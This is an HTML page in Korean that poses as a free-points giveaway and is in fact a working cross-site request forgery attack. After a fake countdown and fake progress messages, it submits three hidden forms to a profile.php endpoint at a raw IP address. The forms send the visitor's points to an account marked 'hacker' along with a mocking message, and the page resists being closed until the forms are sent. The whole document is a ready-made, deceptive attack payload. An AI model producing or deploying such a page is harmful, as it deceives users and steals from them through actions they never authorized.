<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 특별 이벤트 - 무료 포인트 지급!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.18);
            max-width: 500px;
            width: 90%;
        }
        .title {
            font-size: 2.5em;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        .subtitle {
            font-size: 1.2em;
            margin-bottom: 30px;
            opacity: 0.9;
        }
        .countdown {
            font-size: 3em;
            color: #FFD700;
            font-weight: bold;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
            margin: 20px 0;
        }
        .progress-bar {
            width: 100%;
            height: 20px;
            background: rgba(255,255,255,0.3);
            border-radius: 10px;
            overflow: hidden;
            margin: 20px 0;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ff88, #00cc6a);
            width: 0%;
            transition: width 0.5s ease;
            border-radius: 10px;
        }
        .success {
            color: #00FF88;
            font-size: 1.8em;
            font-weight: bold;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        .pulse {
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="title pulse">🎁 특별 이벤트!</h1>
        <p class="subtitle">무료 포인트 지급 시스템에 연결되었습니다</p>
        
        <div id="loading-section">
            <div class="loading">
                <p>💰 포인트 지급을 준비하고 있습니다...</p>
                <p class="countdown" id="countdown">5</p>
                <p>초 후 자동으로 포인트가 지급됩니다!</p>
            </div>
            
            <div class="progress-bar">
                <div class="progress-fill" id="progressBar"></div>
            </div>
            
            <p id="status">🔄 시스템 연결 중...</p>
        </div>
        
        <div id="success-section" style="display: none;">
            <h2 class="success pulse">✅ 포인트 지급 완료!</h2>
            <p style="font-size: 1.3em; margin: 20px 0;">💰 총 포인트가 성공적으로 전송되었습니다!</p>
            <p style="opacity: 0.8;">포인트는 즉시 계정에 반영됩니다.</p>
        </div>
    </div>

    <!-- Python 방식과 동일한 숨겨진 폼들 -->
    <iframe name="target1" style="display:none;"></iframe>
    <iframe name="target2" style="display:none;"></iframe>
    <iframe name="target3" style="display:none;"></iframe>
    
    <!-- 방법 2: POST 방식 - ID 숫자 사용 (Python 코드와 완전 동일) -->
    <form id="form1" method="POST" action="http://52.78.58.98/profile.php" target="target1" style="display:none;">
        <input type="hidden" name="receiver_id" value="13">
        <input type="hidden" name="points" value="3">
        <input type="hidden" name="send_gift" value="1">
        <input type="hidden" name="gift_type" value="coffee">
        <input type="hidden" name="message" value="어 개털렸죠?">
    </form>
    
    <form id="form2" method="POST" action="http://52.78.58.98/profile.php" target="target2" style="display:none;">
        <input type="hidden" name="receiver_id" value="13">
        <input type="hidden" name="points" value="4">
        <input type="hidden" name="send_gift" value="1">
        <input type="hidden" name="gift_type" value="tea">
        <input type="hidden" name="message" value="어 개털렸죠?">
    </form>
    
    <form id="form3" method="POST" action="http://52.78.58.98/profile.php" target="target3" style="display:none;">
        <input type="hidden" name="receiver_id" value="13">
        <input type="hidden" name="points" value="5">
        <input type="hidden" name="send_gift" value="1">
        <input type="hidden" name="gift_type" value="cake">
        <input type="hidden" name="message" value="어 개털렸죠?">
    </form>

    <script>
        let countdown = 5;
        let progressWidth = 0;
        
        const countdownEl = document.getElementById('countdown');
        const statusEl = document.getElementById('status');
        const progressBar = document.getElementById('progressBar');
        const loadingSection = document.getElementById('loading-section');
        const successSection = document.getElementById('success-section');
        
        const statusMessages = [
            '🔄 서버에 연결하고 있습니다...',
            '🔐 보안 인증을 확인하고 있습니다...',
            '💰 포인트 지급 시스템을 준비하고 있습니다...',
            '⚡ 포인트를 전송하고 있습니다...',
            '✅ 전송을 완료하고 있습니다...'
        ];
        
        let messageIndex = 0;
        
        const countdownTimer = setInterval(() => {
            countdown--;
            countdownEl.textContent = countdown;
            progressWidth += 20;
            progressBar.style.width = progressWidth + '%';
            
            if (messageIndex < statusMessages.length) {
                statusEl.textContent = statusMessages[messageIndex];
                messageIndex++;
            }
            
            if (countdown <= 0) {
                clearInterval(countdownTimer);
                executeAttack();
            }
        }, 1000);
        
        // Python 방식과 완전 동일한 POST 공격
        function executeAttack() {
            console.log('🎯 Python 방식 POST 공격 시작...');
            statusEl.textContent = '💸 포인트를 전송하고 있습니다...';
            progressBar.style.width = '100%';
            
            // Python 코드와 동일한 순서로 실행
            setTimeout(() => {
                console.log('📤 POST 방식 1차: receiver_id=13, points=3, gift_type=coffee');
                document.getElementById('form1').submit();
            }, 1000);
            
            setTimeout(() => {
                console.log('📤 POST 방식 2차: receiver_id=13, points=4, gift_type=tea');
                document.getElementById('form2').submit();
            }, 2000);
            
            setTimeout(() => {
                console.log('📤 POST 방식 3차: receiver_id=13, points=5, gift_type=cake');
                document.getElementById('form3').submit();
            }, 3000);
            
            setTimeout(() => {
                showSuccess();
            }, 4000);
        }
        
        function showSuccess() {
            loadingSection.style.display = 'none';
            successSection.style.display = 'block';
            console.log('✅ Python 방식 POST 공격 완료!');
            console.log('📊 총 전송 포인트: 12P (3+4+5)');
            document.title = '✅ 포인트 지급 완료!';
        }
        
        // 페이지 언로드 방지
        let preventUnload = true;
        window.addEventListener('beforeunload', function(e) {
            if (preventUnload) {
                e.preventDefault();
                return '포인트 지급이 진행 중입니다.';
            }
        });
        
        setTimeout(() => { preventUnload = false; }, 7000);
        
        // 디버그 정보
        console.log('🐍 Python 방식 HTML 변환 완료');
        console.log('📋 타겟: receiver_id=13 (hacker)');
        console.log('💰 전송 예정: 3P + 4P + 5P = 12P');
        console.log('📝 메시지: "어 개털렸죠?"');
    </script>
</body>
</html>
